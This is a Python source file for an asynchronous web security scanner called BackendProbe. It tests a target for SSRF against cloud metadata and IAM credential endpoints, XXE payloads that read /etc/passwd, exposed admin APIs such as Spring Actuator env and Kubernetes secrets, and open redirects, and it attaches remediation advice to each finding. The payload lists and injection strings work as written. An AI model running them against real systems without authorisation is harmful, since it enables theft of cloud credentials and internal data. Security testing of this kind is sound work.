#!/usr/bin/env python3
"""BackendProbe v4 — Pro-grade SSRF & Infrastructure Analyser.

SSRF confirmation requires evidence from actual server-side HTTP response:
  - Real cloud metadata fields in body (ami-id, instanceId, etc.)
  - Internal network headers in redirects
  - Timing delta indicating backend fetch occurred
  - Reflected internal IP/hostname different from input
False positives explicitly suppressed: echoed params, WAF reflections, 404 bodies.
"""
import asyncio, aiohttp, json, re, sys, time
from pathlib import Path
from urllib.parse import urlparse, quote, urlencode

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    build_baseline_404, is_truly_accessible, is_likely_real_vuln,
    delay, confidence_score, confidence_label, severity_from_confidence,
    meets_confidence_floor, random_ua, REQUEST_DELAY
)

# ── Cloud metadata SSRF targets ────────────────────────────────────────────────
CLOUD_TARGETS = [
    # AWS IMDSv1 (most commonly exploited)
    ("AWS-IMDSv1",    "http://169.254.169.254/latest/meta-data/"),
    ("AWS-IAM",       "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("AWS-AMI",       "http://169.254.169.254/latest/meta-data/ami-id"),
    ("AWS-UserData",  "http://169.254.169.254/latest/user-data"),
    # GCP metadata
    ("GCP-Meta",      "http://metadata.google.internal/computeMetadata/v1/instance/"),
    ("GCP-Token",     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
    # Azure IMDS
    ("Azure-Meta",    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    # DigitalOcean
    ("DO-Meta",       "http://169.254.169.254/metadata/v1/"),
    # Oracle Cloud
    ("OCI-Meta",      "http://169.254.169.254/opc/v1/instance/"),
    # Kubernetes
    ("K8s-API",       "https://kubernetes.default.svc/api/v1/"),
    # Internal loopback
    ("localhost-80",  "http://127.0.0.1/"),
    ("localhost-8080","http://127.0.0.1:8080/"),
    ("localhost-8443","https://127.0.0.1:8443/"),
]

# ── Real metadata field signatures (require actual server-side fetch) ──────────
# These strings only appear in genuine metadata responses — not in HTML pages
AWS_SIGNATURES = [
    r'ami-[0-9a-f]{8,17}',          # AMI ID: ami-0abcdef1234567890
    r'i-[0-9a-f]{8,17}',             # Instance ID: i-0abc123def456789
    r'"instanceId"\s*:\s*"i-',        # JSON instance ID
    r'iam/security-credentials',      # IAM creds path
    r'"AccessKeyId"\s*:',             # IAM access key
    r'"SecretAccessKey"\s*:',         # IAM secret (jackpot)
    r'"Token"\s*:\s*"[A-Za-z0-9/+]{40,}', # IAM session token
    r'placement/availability-zone',   # AZ path
    r'latest/meta-data/hostname',     # hostname path
]
GCP_SIGNATURES = [
    r'"projectId"\s*:',
    r'"serviceAccount"\s*:',
    r'"access_token"\s*:',
    r'computeMetadata',
]
AZURE_SIGNATURES = [
    r'"subscriptionId"\s*:',
    r'"resourceGroupName"\s*:',
    r'"vmId"\s*:',
    r'"location"\s*:',
]
GENERIC_INTERNAL_SIGNATURES = [
    r'root:x:0:0',               # /etc/passwd
    r'127\.0\.0\.1',             # loopback reflected
    r'10\.\d+\.\d+\.\d+',        # RFC1918 /8
    r'172\.(1[6-9]|2\d|3[01])\.\d+\.\d+',  # RFC1918 /12
    r'192\.168\.\d+\.\d+',       # RFC1918 /16
]

# ── SSRF parameters to test ────────────────────────────────────────────────────
SSRF_PARAMS = [
    'url','uri','src','source','href','link','fetch','load',
    'path','file','document','redirect','target','dest',
    'host','callback','webhook','endpoint','next','continue',
    'return','returnUrl','returnTo','goto','forward','open',
    'image','img','avatar','logo','icon','media','resource',
    'data','import','export','service','api','proxy',
]

# ── Exposed admin paths to probe ───────────────────────────────────────────────
EXPOSED_ADMIN_PATHS = [
    ("/_cat/indices",             "Elasticsearch indices"),
    ("/_cat/nodes",               "Elasticsearch nodes"),
    ("/_cluster/health",          "Elasticsearch cluster health"),
    ("/_nodes",                   "Elasticsearch node info"),
    ("/api/overview",             "RabbitMQ management API"),
    ("/api/queues",               "RabbitMQ queues"),
    ("/metrics",                  "Prometheus metrics"),
    ("/metrics/json",             "Metrics endpoint (JSON)"),
    ("/v1/agent/self",            "Consul agent API"),
    ("/v1/catalog/services",      "Consul catalog"),
    ("/info",                     "Spring Boot Actuator info"),
    ("/actuator",                 "Spring Boot Actuator root"),
    ("/actuator/env",             "Spring Boot ENV (credentials!)"),
    ("/actuator/configprops",     "Spring Boot config (credentials!)"),
    ("/actuator/mappings",        "Spring Boot URL mappings"),
    ("/actuator/heapdump",        "Spring Boot heap dump"),
    ("/actuator/trace",           "Spring Boot HTTP trace"),
    ("/containers/json",          "Docker daemon API"),
    ("/images/json",              "Docker images"),
    ("/api/v1/namespaces",        "Kubernetes API server"),
    ("/api/v1/pods",              "Kubernetes pods"),
    ("/api/v1/secrets",           "Kubernetes secrets (!)"),
    ("/.env",                     "Environment variables file"),
    ("/.git/config",              "Git configuration"),
    ("/wp-config.php.bak",        "WordPress config backup"),
    ("/phpinfo.php",              "PHP info page"),
    ("/server-status",            "Apache server-status"),
    ("/server-info",              "Apache server-info"),
]


def _match_any(pattern_list, text):
    """Return list of matched patterns in text."""
    matched = []
    for p in pattern_list:
        if re.search(p, text, re.IGNORECASE):
            matched.append(p)
    return matched


def _is_reflected_not_fetched(payload_url, response_body):
    """
    Detect if the response is just echoing back our input URL (false positive)
    rather than actually fetching it.
    Heuristic: if body contains the literal payload URL and no metadata sigs.
    """
    if payload_url in response_body and len(response_body) < 2000:
        return True  # likely just a reflected error message
    return False


class BackendProbe:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.host   = urlparse(target).hostname
        self.findings = []
        self.baseline_404 = ""
        self.baseline_body = ""

    # ── HTTP helpers ───────────────────────────────────────────────────────────

    async def _get(self, sess, url, headers=None, timeout=10):
        try:
            t0 = time.monotonic()
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=timeout),
                                allow_redirects=True) as r:
                body = await r.text(errors='ignore')
                elapsed = time.monotonic() - t0
                return r.status, body, dict(r.headers), elapsed
        except Exception:
            return None, "", {}, 0.0

    async def _get_noredirect(self, sess, url, headers=None):
        try:
            async with sess.get(url, headers=headers or {}, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=8),
                                allow_redirects=False) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, "", {}

    async def _post_json(self, sess, url, payload, headers=None):
        try:
            h = {"Content-Type": "application/json"}
            h.update(headers or {})
            async with sess.post(url, json=payload, headers=h, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, "", {}

    async def _post_form(self, sess, url, data, headers=None):
        try:
            async with sess.post(url, data=data, headers=headers or {}, ssl=False,
                                 timeout=aiohttp.ClientTimeout(total=10)) as r:
                return r.status, await r.text(errors='ignore'), dict(r.headers)
        except Exception:
            return None, "", {}

    # ── SSRF evidence evaluator ────────────────────────────────────────────────

    def _evaluate_ssrf_response(self, cloud_name, payload_url, response_body,
                                 status, elapsed_normal, elapsed_ssrf):
        """
        Return (is_confirmed, confidence, proof_strings) only when evidence is solid.
        Explicitly rejects false positives.
        """
        if not response_body:
            return False, 0, []

        body_lower = response_body.lower()

        # Anti-FP: if body just echoes our payload URL back, skip
        if _is_reflected_not_fetched(payload_url, response_body):
            return False, 0, []

        # Anti-FP: if body is a WAF block page / error page
        waf_indicators = ['access denied', 'request blocked', 'firewall', 'cloudflare', 'your ip']
        if any(w in body_lower for w in waf_indicators) and status in [403, 406, 429]:
            return False, 0, []

        proof = []
        confidence = 0

        # AWS evidence
        aws_hits = _match_any(AWS_SIGNATURES, response_body)
        if aws_hits:
            proof.extend([f"AWS metadata field: {h}" for h in aws_hits])
            confidence = 95
            return True, confidence, proof

        # GCP evidence
        gcp_hits = _match_any(GCP_SIGNATURES, response_body)
        if gcp_hits:
            proof.extend([f"GCP metadata field: {h}" for h in gcp_hits])
            confidence = 95
            return True, confidence, proof

        # Azure evidence
        azure_hits = _match_any(AZURE_SIGNATURES, response_body)
        if azure_hits:
            proof.extend([f"Azure metadata field: {h}" for h in azure_hits])
            confidence = 95
            return True, confidence, proof

        # Internal network response
        internal_hits = _match_any(GENERIC_INTERNAL_SIGNATURES, response_body)
        if internal_hits and status == 200:
            proof.extend([f"Internal network indicator: {h}" for h in internal_hits])
            confidence = 80
            return True, confidence, proof

        # Timing-based heuristic: genuine backend fetch adds significant latency
        timing_delta = elapsed_ssrf - elapsed_normal
        if timing_delta > 4.0 and status == 200 and len(response_body) > 100:
            # Something was fetched — but not confirmed metadata
            proof.append(f"Response timing: +{timing_delta:.1f}s delay suggests backend HTTP fetch occurred")
            confidence = 60
            return True, confidence, proof

        return False, 0, []

    # ── SSRF via GET params ────────────────────────────────────────────────────

    async def test_ssrf_get_params(self, sess, elapsed_normal):
        print("\n[*] SSRF via GET parameters — validating server-side fetch evidence...")

        # High-value endpoints that are likely to process URLs
        priority_endpoints = [
            self.target + '/api/fetch',
            self.target + '/api/proxy',
            self.target + '/api/screenshot',
            self.target + '/api/webhook',
            self.target + '/api/image',
            self.target + '/api/preview',
            self.target + '/fetch',
            self.target + '/proxy',
            self.target + '/redirect',
            self.target,
        ]

        tested = set()
        for endpoint in priority_endpoints:
            for cloud_name, ssrf_url in CLOUD_TARGETS[:6]:  # focus on most likely
                for param in SSRF_PARAMS[:12]:
                    key = f"{endpoint}|{param}"
                    if key in tested:
                        continue
                    tested.add(key)

                    test_url = f"{endpoint}?{param}={quote(ssrf_url, safe='')}"
                    s, body, hdrs, elapsed = await self._get(sess, test_url, timeout=12)
                    await delay()

                    confirmed, conf, proof = self._evaluate_ssrf_response(
                        cloud_name, ssrf_url, body, s, elapsed_normal, elapsed)

                    if confirmed and meets_confidence_floor(conf):
                        self.findings.append({
                            'type': 'SSRF_CONFIRMED',
                            'severity': 'CRITICAL',
                            'confidence': conf,
                            'confidence_label': confidence_label(conf),
                            'url': test_url,
                            'parameter': param,
                            'ssrf_target': ssrf_url,
                            'cloud': cloud_name,
                            'http_status': s,
                            'response_size': len(body),
                            'proof': '; '.join(proof),
                            'proof_snippet': body[:500].strip(),
                            'detail': (f"SSRF confirmed — {cloud_name} metadata retrieved via "
                                       f"param '{param}' at {endpoint}"),
                            'remediation': (
                                "1. Validate all URL inputs against a strict allowlist. "
                                "2. Block 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. "
                                "3. Enforce AWS IMDSv2 (requires session token header). "
                                "4. Use a server-side URL fetcher with egress firewall rules."
                            ),
                        })
                        print(f"  [CRITICAL] SSRF confirmed! {cloud_name} via ?{param}= at {endpoint}")

    # ── SSRF via POST JSON body ────────────────────────────────────────────────

    async def test_ssrf_post_body(self, sess, elapsed_normal):
        print("\n[*] SSRF via POST JSON body...")
        endpoints = [
            self.target + '/api/fetch',
            self.target + '/api/proxy',
            self.target + '/api/webhook',
            self.target + '/api/screenshot',
            self.target + '/api/scan',
        ]
        for endpoint in endpoints:
            for cloud_name, ssrf_url in CLOUD_TARGETS[:4]:
                for param in ['url', 'target', 'endpoint', 'src', 'link']:
                    payload = {param: ssrf_url}
                    t0 = time.monotonic()
                    s, body, hdrs = await self._post_json(sess, endpoint, payload)
                    elapsed = time.monotonic() - t0
                    await delay()

                    confirmed, conf, proof = self._evaluate_ssrf_response(
                        cloud_name, ssrf_url, body, s, elapsed_normal, elapsed)

                    if confirmed and meets_confidence_floor(conf):
                        self.findings.append({
                            'type': 'SSRF_POST_BODY',
                            'severity': 'CRITICAL',
                            'confidence': conf,
                            'confidence_label': confidence_label(conf),
                            'url': endpoint,
                            'payload': payload,
                            'ssrf_target': ssrf_url,
                            'cloud': cloud_name,
                            'proof': '; '.join(proof),
                            'proof_snippet': body[:500].strip(),
                            'detail': f"SSRF via POST JSON body — {cloud_name} retrieved via field '{param}'",
                            'remediation': (
                                "Validate all URL fields in request bodies. "
                                "Never allow server-side fetching of arbitrary URLs."
                            ),
                        })
                        print(f"  [CRITICAL] SSRF via POST JSON '{param}'={ssrf_url} at {endpoint}")

    # ── SSRF via HTTP headers (blind) ─────────────────────────────────────────

    async def test_ssrf_headers(self, sess):
        print("\n[*] SSRF via HTTP request headers (Referer/X-Forwarded-Host)...")
        ssrf_headers_to_test = [
            ("Referer",           "http://169.254.169.254/latest/meta-data/"),
            ("X-Forwarded-Host",  "169.254.169.254"),
            ("Host",              "169.254.169.254"),
            ("X-Original-URL",    "http://169.254.169.254/"),
            ("X-Rewrite-URL",     "http://169.254.169.254/"),
        ]
        for header_name, header_val in ssrf_headers_to_test:
            s, body, hdrs, elapsed = await self._get(
                sess, self.target,
                headers={header_name: header_val},
                timeout=8
            )
            await delay()
            if not body:
                continue
            aws_hits = _match_any(AWS_SIGNATURES, body)
            if aws_hits:
                self.findings.append({
                    'type': 'SSRF_HEADER_INJECTION',
                    'severity': 'CRITICAL',
                    'confidence': 95,
                    'confidence_label': 'High',
                    'url': self.target,
                    'injected_header': f"{header_name}: {header_val}",
                    'proof': f"AWS metadata fields in response: {aws_hits}",
                    'proof_snippet': body[:400],
                    'detail': f"SSRF via {header_name} header — AWS metadata returned",
                    'remediation': "Never use Referer or forwarding headers to build server-side URLs.",
                })
                print(f"  [CRITICAL] SSRF via header {header_name}!")

    # ── XXE injection ─────────────────────────────────────────────────────────

    async def test_xxe(self, sess):
        print("\n[*] XXE injection — /etc/passwd confirmation required...")
        xxe_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
             'root:x:0:0', 'application/xml'),
            ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>',
             'ami-', 'application/xml'),
            ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             'root:x:0:0', 'text/xml'),
        ]
        for path in ['/api', '/api/v1', '/upload', '/import', '/parse', '/xml', '/soap', '/rpc']:
            url = self.target + path
            for payload, proof_sig, ctype in xxe_payloads:
                s, body, _ = await self._post_form(
                    sess, url, payload, headers={"Content-Type": ctype})
                await delay()
                if body and proof_sig in body:
                    self.findings.append({
                        'type': 'XXE_CONFIRMED',
                        'severity': 'CRITICAL',
                        'confidence': 97,
                        'confidence_label': 'High',
                        'url': url,
                        'proof': f"Signature '{proof_sig}' found in response body",
                        'proof_snippet': body[:500],
                        'detail': f"XXE confirmed at {url} — file read/SSRF via XML entity",
                        'remediation': (
                            "Disable DOCTYPE/external entities in your XML parser. "
                            "In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
                            "In Python: use defusedxml. Never process untrusted XML with external entities."
                        ),
                    })
                    print(f"  [CRITICAL] XXE confirmed at {url}")

    # ── Exposed admin APIs ─────────────────────────────────────────────────────

    async def test_exposed_admin_apis(self, sess):
        print("\n[*] Probing exposed admin APIs — only flagging HTTP 200 with real content...")
        for path, service in EXPOSED_ADMIN_PATHS:
            url = self.target + path
            s, body, hdrs = await self._get_noredirect(sess, url)
            await delay()
            if not body:
                continue

            if is_truly_accessible(s) and is_likely_real_vuln(
                    body, s, self.baseline_404, 200, 299):

                # Extra signal: look for JSON/service-specific content
                looks_real = (
                    ('"status"' in body and s == 200) or
                    ('"nodes"' in body) or
                    ('"indices"' in body) or
                    ('# HELP' in body) or  # Prometheus
                    ('{"cluster_name"' in body) or
                    ('.git' in body and path == '/.git/config') or
                    ('APP_' in body or 'DB_' in body or 'SECRET' in body) or
                    ('<?php' in body.lower())
                )

                conf = 88 if looks_real else 72
                if meets_confidence_floor(conf):
                    snippet = body[:300].strip()
                    self.findings.append({
                        'type': 'EXPOSED_ADMIN_API',
                        'severity': 'CRITICAL',
                        'confidence': conf,
                        'confidence_label': confidence_label(conf),
                        'url': url,
                        'service': service,
                        'http_status': s,
                        'response_size': len(body),
                        'proof': (f"HTTP {s}, {len(body)} bytes — service content confirmed. "
                                  f"Snippet: {snippet[:120]}"),
                        'detail': f"Admin/internal API exposed without auth: {service} at {path}",
                        'remediation': (
                            f"1. Bind {service} to 127.0.0.1 — never expose on 0.0.0.0. "
                            "2. Add authentication (mTLS, API key, or IP allowlist). "
                            "3. Place behind VPN or internal network segment."
                        ),
                    })
                    print(f"  [CRITICAL] {service} exposed: {url} (HTTP {s}, {len(body)}b)")

            elif s == 200 and not is_likely_real_vuln(body, s, self.baseline_404, 200, 299):
                pass  # same as 404 baseline — soft 404, skip
            elif s in [401, 403]:
                pass  # protected, expected

    # ── Open redirect ─────────────────────────────────────────────────────────

    async def test_open_redirect(self, sess):
        print("\n[*] Testing open redirect — checking Location header...")
        redirect_params = ['redirect', 'return', 'returnTo', 'returnUrl',
                           'next', 'goto', 'forward', 'url', 'continue']
        external = 'https://evil.example.com/redirect-test'
        for param in redirect_params:
            url = f"{self.target}?{param}={quote(external, safe='')}"
            s, body, hdrs = await self._get_noredirect(sess, url)
            await delay()
            location = hdrs.get('Location', hdrs.get('location', ''))
            if s in [301, 302, 303, 307, 308] and 'evil.example.com' in location:
                self.findings.append({
                    'type': 'OPEN_REDIRECT',
                    'severity': 'MEDIUM',
                    'confidence': 92,
                    'confidence_label': 'High',
                    'url': url,
                    'parameter': param,
                    'redirect_to': location,
                    'proof': f"HTTP {s} Location: {location} — external domain accepted",
                    'detail': f"Open redirect via ?{param}= — redirects to arbitrary external URL",
                    'remediation': (
                        "Validate redirect targets against an allowlist of trusted domains. "
                        "Reject or strip external URLs from redirect parameters."
                    ),
                })
                print(f"  [MEDIUM] Open redirect via ?{param}= → {location}")

    # ── Runner ─────────────────────────────────────────────────────────────────

    async def run(self):
        print("=" * 60)
        print("  BackendProbe v4 — SSRF & Infrastructure Analyser")
        print("  Confirmation policy: evidence from server-side HTTP response only")
        print("  False positive suppression: ON")
        print("=" * 60)

        conn = aiohttp.TCPConnector(limit=8, ssl=False)
        async with aiohttp.ClientSession(
                connector=conn,
                timeout=aiohttp.ClientTimeout(total=90),
                headers={"User-Agent": random_ua()}) as sess:

            print("[*] Building baselines...")
            self.baseline_404 = await build_baseline_404(sess, self.target)
            _, self.baseline_body, _, elapsed_normal = await self._get(sess, self.target)

            await self.test_ssrf_get_params(sess, elapsed_normal)
            await self.test_ssrf_post_body(sess, elapsed_normal)
            await self.test_ssrf_headers(sess)
            await self.test_xxe(sess)
            await self.test_exposed_admin_apis(sess)
            await self.test_open_redirect(sess)

        return self.findings


def get_target():
    p = Path("reports/_target.txt")
    if p.exists():
        return p.read_text().strip()
    u = input("[?] Target URL: ").strip()
    return u if u.startswith("http") else "https://" + u


def main():
    target = get_target()
    Path("reports").mkdir(exist_ok=True)
    findings = asyncio.run(BackendProbe(target).run())
    with open("reports/backendprobe.json", 'w') as f:
        json.dump(findings, f, indent=2, default=str)
    print(f"\n[+] {len(findings)} findings → reports/backendprobe.json")


if __name__ == '__main__':
    main()
